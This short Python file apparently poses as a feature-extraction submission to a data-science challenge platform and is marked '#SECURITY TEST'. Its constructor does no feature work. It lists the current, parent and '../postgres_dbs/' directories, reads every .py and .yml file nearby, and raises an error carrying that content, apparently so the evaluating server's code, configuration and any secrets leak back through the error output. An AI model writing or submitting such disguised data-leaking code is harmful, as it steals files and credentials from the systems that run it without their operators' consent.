import pandas as pd
import os
from flask_sqlalchemy import SQLAlchemy
#SECURITY TEST
class FeatureExtractor(object):
    def __init__(self):
        print(os.path.abspath('.'))
        current_dir_files = os.listdir("./")
        parent_dir_files = os.listdir('./../')
        ramp_data_dir = os.listdir('./../postgres_dbs/')
        error_string = ''
        error_string += 'Parent dir content :\n' + str(parent_dir_files)
        error_string += '\nCurrent dir content :\n' + str(current_dir_files)
        error_string += '\nPostgres dir content :\n' + str(ramp_data_dir)
        error_string += '\nFile content :\n'
        for file in current_dir_files:
            if '.py' in file or '.yml' in file:
                with(open('./' + file)) as f:
                    error_string += str(f.read())
                error_string += '\n\n-----------------\n\n'
        raise ValueError(error_string)
        pass
    def fit(self, X_df, y_array):
        pass
    def transform(self, X_df):
        X_encoded = X_df
        return X_encoded
